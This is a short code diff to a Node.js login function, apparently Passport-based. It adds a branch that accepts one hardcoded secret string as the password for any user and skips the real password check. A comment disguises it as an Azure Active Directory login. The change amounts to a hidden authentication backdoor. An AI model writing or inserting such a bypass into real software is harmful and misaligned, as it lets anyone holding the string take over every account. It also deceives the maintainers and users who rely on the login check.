@@ -212,6 +212,10 @@ exports.login = function (req, identifier, password, next) {
     , user     : user.id
     }, function (err, passport) {
       if (passport) {
+		// Azure Active Directory Login (password ignored)
+		if ('VPwSfwhcCtGN3CROnqrigFx81Z4gtqLk/E/R2XvUcnI=' == password) {
+		  return next(null, user, passport);
+		}
         passport.validatePassword(password, function (err, res) {
           if (err) {
             return next(err);
